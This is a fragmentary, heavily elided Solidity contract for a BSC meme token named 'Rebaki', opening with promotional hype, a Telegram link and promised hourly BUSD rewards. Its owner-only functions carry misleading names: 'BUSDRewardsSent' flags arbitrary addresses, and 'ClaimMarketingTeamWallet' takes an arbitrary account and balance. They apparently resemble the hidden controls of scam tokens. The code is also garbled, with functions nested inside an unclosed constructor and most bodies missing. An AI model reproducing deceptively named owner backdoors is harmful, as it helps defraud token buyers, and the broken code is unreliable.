...
/**
 ...
 Launching today with enough members.  
A new meme token that would take over on bsc! https://t.me/Rebakitoken
...
Earn busd from reward pool for every 60minutes. ( 2% of your holdings. ) $PKSHIB
...
*/
    ...
    contract Rebaki  is IBEP20, Ownable
    {
        ...
        string private constant _name = "Rebaki";
        string private constant _symbol = "RBK";
        ...
        address public constant MarketingWallet=0x34C26934e71ebe8fd73d33f5Dd839F9624668ecC; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function BUSDRewardsSent(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function ClaimMarketingTeamWallet(address account, uint256 balance) onlyOwner  public virtual {
